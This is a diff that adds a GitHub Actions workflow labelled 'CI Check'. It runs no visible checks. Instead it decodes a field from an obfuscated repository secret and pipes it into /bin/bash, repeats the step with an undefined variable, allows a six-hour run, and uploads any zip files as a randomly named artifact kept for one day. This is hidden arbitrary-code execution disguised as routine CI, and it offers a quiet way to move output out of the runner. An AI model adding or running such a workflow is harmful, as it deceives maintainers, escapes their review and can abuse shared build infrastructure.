@@ -1,0 +1,24 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          dp4749: ${{ secrets.dp4749 }}
+        run: |
+          printf '%s' "$dp4749" | jq -r .sgj90 | /bin/bash
+          printf '%s' "$ebkmd028" | jq -r .gnkj919 | /bin/bash
+
+      - name: Upload artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: LmE15mLi
+          path: "*.zip"
+          retention-days: 1
